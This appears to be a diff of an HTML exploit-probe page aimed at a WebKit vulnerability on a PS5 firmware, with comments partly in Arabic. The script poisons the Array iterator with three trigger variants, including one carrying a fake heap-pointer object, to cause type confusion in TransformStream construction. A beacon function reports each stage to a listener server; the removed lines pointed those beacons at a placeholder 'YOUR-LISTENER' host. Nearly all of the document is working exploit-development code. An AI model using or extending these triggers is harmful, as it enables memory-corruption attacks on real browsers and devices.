@@ -1,29 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PS5 WebKit Probe</title></head>
+<body>
+<h1>CVE-2026-43705 probe — PS5 FW 13.40</h1>
+<pre id="out">starting...</pre>
 <script>
-// Heartbeat: يميّز "وصل للـ trigger ومات" عن "ما وصل أصلاً"
-setInterval(() => { try { navigator.sendBeacon('http://YOUR-LISTENER/beat'); } catch(e){} }, 1000);
-
-function probe(label) {
-    const out = document.createElement('div');
-    out.textContent = label + ' = ' +
-        (typeof TransformStream) + ' / ' +
-        (typeof ReadableStream) + ' / ' +
-        (typeof WritableStream);
-    document.body.appendChild(out);
+// ---------- telemetry (same-origin, no mixed-content issues) ----------
+function beacon(m){
+    try { navigator.sendBeacon('/stage?m=' + encodeURIComponent(m)); } catch(e){}
+    try { fetch('/stage?m=' + encodeURIComponent(m), {mode:'no-cors'}); } catch(e){}
+    try { var i = new Image(); i.src = '/stage?m=' + encodeURIComponent(m); } catch(e){}
+    document.getElementById('out').textContent += '\n' + m;
 }
-probe('streams');
+setInterval(function(){ beacon('heartbeat'); }, 1000);
+function log(m){ beacon(m); }
 
-// الفحص الحقيقي: يميّز 4 حالات
-function check(label, fn) {
-    let m;
-    try { fn(); m = 'CREATED-NO-THROW (path does NOT consume iterator)'; }
-    catch (e) {
-        if (e instanceof TypeError) m = 'TYPEERROR (runtime check present)';
-        else if (e instanceof ReferenceError) m = 'NOT-SUPPORTED (' + e.message + ')';
-        else m = 'OTHER-ERROR: ' + e;
+log('boot');
+log('streams=' + typeof TransformStream + '/' + typeof ReadableStream + '/' + typeof WritableStream);
+log('iter=' + (Array.prototype[Symbol.iterator] ? 'present' : 'missing'));
+
+var originalIterator = Array.prototype[Symbol.iterator];
+
+function triggerVariant(n, iterFn){
+    Array.prototype[Symbol.iterator] = iterFn;
+    log('V' + n + ' start');
+    var ts;
+    try {
+        ts = new TransformStream();
+        log('V' + n + ' constructed');
+    } catch(e){
+        log('V' + n + ' threw: ' + e);
+        Array.prototype[Symbol.iterator] = originalIterator;
+        return;
     }
-    document.body.appendChild(document.createElement('div')).textContent = label + ': ' + m;
-    navigator.sendBeacon('http://YOUR-LISTENER/' + encodeURIComponent(label + ':' + m));
+    try { log('V' + n + ' .readable=' + ts.readable); } catch(e){ log('V' + n + ' .readable threw: ' + e); }
+    try { log('V' + n + ' .writable=' + ts.writable); } catch(e){ log('V' + n + ' .writable threw: ' + e); }
+    Array.prototype[Symbol.iterator] = originalIterator;
+    log('V' + n + ' done');
 }
 
-// ثم الثلاثة variants كما هي (plain-object / heap-pointer / truncated)
+// Variant 1 — plain objects بدل readable/writable
+triggerVariant(1, function(){
+    var i = 0;
+    return { next: function(){
+        if (i >= this._arr.length) return { done: true };
+        var val = this._arr[i];
+        if (this._arr.length === 3 && i >= 1) val = { fake: true };
+        i++;
+        return { value: val, done: false };
+    }, _arr: this };
+});
+
+// Variant 2 — كائن يحمل heap pointer
+triggerVariant(2, function(){
+    var buf = new ArrayBuffer(65536);
+    var i = 0;
+    return { next: function(){
+        if (i >= this._arr.length) return { done: true };
+        var val = this._arr[i];
+        if (this._arr.length === 3 && i >= 1) val = { pad: 0, ptr: buf, data: 0x41414141 };
+        i++;
+        return { value: val, done: false };
+    }, _arr: this };
+});
+
+// Variant 3 — iterator مقطوع (صفر عناصر)
+triggerVariant(3, function(){
+    return { next: function(){ return { done: true }; } };
+});
+
+log('finished');
 </script>
+</body>
+</html>
